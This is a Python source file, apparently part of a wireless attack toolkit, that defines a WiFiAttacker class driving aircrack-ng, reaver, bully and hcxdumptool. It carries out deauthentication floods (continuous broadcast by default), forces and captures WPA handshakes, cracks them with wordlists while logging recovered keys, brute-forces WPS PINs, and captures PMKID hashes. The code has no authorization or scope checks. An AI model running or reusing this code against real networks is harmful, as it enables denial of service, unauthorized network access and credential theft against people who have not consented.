"""WiFi Attack module — deauth, handshake capture, WPS brute-force."""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Optional, Callable

from core.logger import get_logger, get_audit_logger

log = get_logger("wifi_attacker")


class WiFiAttacker:
    """WiFi attack capabilities using aircrack-ng suite and reaver.

    Supports:
      - Deauthentication attacks (targeted and broadcast)
      - WPA/WPA2 handshake capture
      - Handshake cracking with wordlist
      - WPS PIN brute-force via reaver/bully
      - PMKID capture via hcxdumptool
    """

    def __init__(self) -> None:
        self._deauth_proc: Optional[subprocess.Popen] = None
        self._capture_proc: Optional[subprocess.Popen] = None
        self._crack_proc: Optional[subprocess.Popen] = None
        self._wps_proc: Optional[subprocess.Popen] = None
        self._running = threading.Event()
        self._temp_dir = tempfile.mkdtemp(prefix="holocaust_wifi_atk_")

    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    # === Deauthentication ===

    def deauth(self, interface: str, bssid: str, client_mac: str = "",
               count: int = 0, on_output: Optional[Callable] = None) -> bool:
        """Send deauthentication frames.

        Args:
            interface: Monitor-mode interface
            bssid: Target AP BSSID
            client_mac: Specific client MAC (empty = broadcast deauth)
            count: Number of deauth packets (0 = continuous)
            on_output: Callback for aireplay-ng output
        """
        audit = get_audit_logger()
        if audit:
            target = client_mac or "broadcast"
            audit.log_action("wifi_deauth", bssid, f"client={target}, count={count}")

        try:
            cmd = [
                "sudo", "aireplay-ng",
                "--deauth", str(count) if count > 0 else "0",
                "-a", bssid,
            ]
            if client_mac:
                cmd.extend(["-c", client_mac])
            cmd.append(interface)

            log.info(f"Deauth attack: AP={bssid}, client={client_mac or 'all'}, "
                     f"count={'continuous' if count == 0 else count}")

            self._deauth_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            self._running.set()

            # Read output in background
            if on_output:
                thread = threading.Thread(
                    target=self._read_output, args=(self._deauth_proc, on_output),
                    daemon=True,
                )
                thread.start()

            return True

        except FileNotFoundError:
            log.error("aireplay-ng not found — install aircrack-ng suite")
            return False
        except Exception as e:
            log.error(f"Deauth failed: {e}")
            return False

    def stop_deauth(self) -> None:
        """Stop deauthentication attack."""
        if self._deauth_proc and self._deauth_proc.poll() is None:
            self._deauth_proc.terminate()
            try:
                self._deauth_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._deauth_proc.kill()
            self._deauth_proc = None
            log.info("Deauth attack stopped")

    # === Handshake Capture ===

    def capture_handshake(self, interface: str, bssid: str, channel: int,
                          timeout: int = 120,
                          auto_deauth: bool = True,
                          on_output: Optional[Callable] = None) -> Optional[str]:
        """Capture WPA/WPA2 4-way handshake.

        Args:
            interface: Monitor-mode interface
            bssid: Target AP BSSID
            channel: AP channel
            timeout: Capture timeout in seconds
            auto_deauth: Send deauth to force handshake
            on_output: Callback for status updates

        Returns:
            Path to capture file (.cap) or None if failed
        """
        audit = get_audit_logger()
        if audit:
            audit.log_action("handshake_capture", bssid, f"ch={channel}, timeout={timeout}s")

        cap_prefix = Path(self._temp_dir) / f"handshake_{bssid.replace(':', '')}"

        try:
            # Start airodump-ng capture on target channel
            cmd = [
                "sudo", "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "--write", str(cap_prefix),
                "--output-format", "cap",
                interface,
            ]

            self._capture_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            self._running.set()

            if on_output:
                on_output(f"Capturing on channel {channel}, target {bssid}...")

            # Auto-deauth after short delay to force handshake
            if auto_deauth:
                time.sleep(5)
                if on_output:
                    on_output("Sending deauth to force handshake...")
                self.deauth(interface, bssid, count=10)
                time.sleep(3)
                self.stop_deauth()

            # Wait for handshake or timeout
            start = time.time()
            cap_file = f"{cap_prefix}-01.cap"

            while time.time() - start < timeout:
                if not self._running.is_set():
                    break

                # Check if handshake captured
                if Path(cap_file).exists():
                    if self._check_handshake(cap_file, bssid):
                        if on_output:
                            on_output(f"Handshake captured! File: {cap_file}")
                        log.info(f"WPA handshake captured for {bssid}: {cap_file}")
                        self._stop_capture()
                        return cap_file

                time.sleep(2)

            if on_output:
                on_output("Capture timeout — no handshake obtained")
            log.warning(f"Handshake capture timed out for {bssid}")
            self._stop_capture()

            # Return cap file even without confirmed handshake
            if Path(cap_file).exists():
                return cap_file
            return None

        except FileNotFoundError:
            log.error("airodump-ng not found — install aircrack-ng suite")
            return None
        except Exception as e:
            log.error(f"Handshake capture failed: {e}")
            self._stop_capture()
            return None

    def _stop_capture(self) -> None:
        if self._capture_proc and self._capture_proc.poll() is None:
            self._capture_proc.terminate()
            try:
                self._capture_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._capture_proc.kill()
            self._capture_proc = None

    def _check_handshake(self, cap_file: str, bssid: str) -> bool:
        """Check if capture file contains a valid handshake."""
        try:
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=10,
            )
            # aircrack-ng outputs "1 handshake" if found
            return "1 handshake" in result.stdout
        except Exception:
            return False

    # === Handshake Cracking ===

    def crack_handshake(self, cap_file: str, bssid: str, wordlist: str,
                        on_output: Optional[Callable] = None) -> Optional[str]:
        """Crack WPA/WPA2 handshake with wordlist.

        Args:
            cap_file: Path to .cap file with handshake
            bssid: Target AP BSSID
            wordlist: Path to wordlist file

        Returns:
            Password if cracked, None otherwise
        """
        audit = get_audit_logger()
        if audit:
            audit.log_action("handshake_crack", bssid, f"wordlist={wordlist}")

        if not Path(cap_file).exists():
            log.error(f"Capture file not found: {cap_file}")
            return None

        if not Path(wordlist).exists():
            log.error(f"Wordlist not found: {wordlist}")
            return None

        try:
            cmd = [
                "aircrack-ng",
                "-b", bssid,
                "-w", wordlist,
                cap_file,
            ]

            if on_output:
                on_output(f"Cracking handshake with wordlist: {wordlist}")

            self._crack_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            self._running.set()

            output_lines = []
            for line in self._crack_proc.stdout:
                line = line.strip()
                output_lines.append(line)
                if on_output:
                    on_output(line)

                # Check for success
                if "KEY FOUND!" in line:
                    # Extract key from output
                    match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", line)
                    if match:
                        password = match.group(1)
                        log.info(f"WPA key cracked for {bssid}: {password}")
                        return password

            self._crack_proc.wait()
            log.info(f"Wordlist exhausted — password not found for {bssid}")
            return None

        except FileNotFoundError:
            log.error("aircrack-ng not found")
            return None
        except Exception as e:
            log.error(f"Crack failed: {e}")
            return None
        finally:
            self._running.clear()

    # === WPS Attack ===

    def wps_attack(self, interface: str, bssid: str, channel: int,
                   method: str = "reaver",
                   timeout: int = 600,
                   on_output: Optional[Callable] = None) -> Optional[dict]:
        """WPS PIN brute-force attack.

        Args:
            interface: Monitor-mode interface
            bssid: Target AP BSSID
            channel: AP channel
            method: "reaver" or "bully"
            timeout: Attack timeout in seconds

        Returns:
            Dict with pin and password if successful, None otherwise
        """
        audit = get_audit_logger()
        if audit:
            audit.log_action("wps_attack", bssid, f"method={method}, ch={channel}")

        try:
            if method == "reaver":
                cmd = [
                    "sudo", "reaver",
                    "-i", interface,
                    "-b", bssid,
                    "-c", str(channel),
                    "-vv",  # verbose
                    "-K", "1",  # try Pixie-Dust first
                    "-N",  # no nacks
                ]
            else:  # bully
                cmd = [
                    "sudo", "bully",
                    interface,
                    "-b", bssid,
                    "-c", str(channel),
                    "-v", "3",
                ]

            if on_output:
                on_output(f"Starting WPS {method} attack on {bssid} (ch {channel})...")

            self._wps_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            self._running.set()

            pin = None
            password = None
            start = time.time()

            for line in self._wps_proc.stdout:
                if not self._running.is_set():
                    break
                if time.time() - start > timeout:
                    if on_output:
                        on_output("WPS attack timed out")
                    break

                line = line.strip()
                if on_output and line:
                    on_output(line)

                # Parse reaver output
                pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", line)
                if pin_match:
                    pin = pin_match.group(1)

                pass_match = re.search(r"WPA PSK:\s*'(.+?)'", line)
                if pass_match:
                    password = pass_match.group(1)

                if pin and password:
                    log.info(f"WPS cracked {bssid}: PIN={pin}, PSK={password}")
                    self.stop_wps()
                    return {"pin": pin, "password": password, "bssid": bssid}

            self.stop_wps()

            if pin:
                return {"pin": pin, "password": password or "", "bssid": bssid}
            return None

        except FileNotFoundError:
            log.error(f"{method} not found — install it first")
            return None
        except Exception as e:
            log.error(f"WPS attack failed: {e}")
            return None
        finally:
            self._running.clear()

    def stop_wps(self) -> None:
        if self._wps_proc and self._wps_proc.poll() is None:
            self._wps_proc.terminate()
            try:
                self._wps_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._wps_proc.kill()
            self._wps_proc = None

    # === PMKID Capture ===

    def capture_pmkid(self, interface: str, bssid: str, channel: int,
                      timeout: int = 30,
                      on_output: Optional[Callable] = None) -> Optional[str]:
        """Capture PMKID using hcxdumptool (clientless attack).

        Returns path to PMKID hash file or None.
        """
        audit = get_audit_logger()
        if audit:
            audit.log_action("pmkid_capture", bssid, f"ch={channel}")

        output_file = Path(self._temp_dir) / f"pmkid_{bssid.replace(':', '')}.pcapng"
        filter_file = Path(self._temp_dir) / "filter.txt"

        try:
            # Write filter file with target BSSID
            filter_file.write_text(bssid.replace(":", "").lower())

            cmd = [
                "sudo", "hcxdumptool",
                "-i", interface,
                "-o", str(output_file),
                "--filterlist_ap", str(filter_file),
                "--filtermode=2",
                "--enable_status=1",
            ]

            if on_output:
                on_output(f"Capturing PMKID from {bssid}...")

            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )

            start = time.time()
            while time.time() - start < timeout:
                if proc.poll() is not None:
                    break
                time.sleep(1)

            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

            if output_file.exists() and output_file.stat().st_size > 0:
                # Convert to hashcat format
                hash_file = Path(self._temp_dir) / f"pmkid_{bssid.replace(':', '')}.hash"
                convert_result = subprocess.run(
                    ["hcxpcapngtool", "-o", str(hash_file), str(output_file)],
                    capture_output=True, text=True, timeout=10,
                )
                if hash_file.exists():
                    if on_output:
                        on_output(f"PMKID captured! Hash file: {hash_file}")
                    log.info(f"PMKID captured for {bssid}: {hash_file}")
                    return str(hash_file)

            if on_output:
                on_output("No PMKID obtained — AP may not support it")
            return None

        except FileNotFoundError:
            log.error("hcxdumptool not found — install hcxtools")
            return None
        except Exception as e:
            log.error(f"PMKID capture failed: {e}")
            return None

    # === Utilities ===

    def stop_all(self) -> None:
        """Stop all running attacks."""
        self._running.clear()
        self.stop_deauth()
        self._stop_capture()
        self.stop_wps()

        if self._crack_proc and self._crack_proc.poll() is None:
            self._crack_proc.terminate()
            self._crack_proc = None

        log.info("All WiFi attacks stopped")

    @staticmethod
    def _read_output(proc: subprocess.Popen, callback: Callable) -> None:
        """Read subprocess output and forward to callback."""
        if not proc.stdout:
            return
        try:
            for line in proc.stdout:
                line = line.strip()
                if line:
                    callback(line)
        except Exception:
            pass

    def __del__(self) -> None:
        self.stop_all()
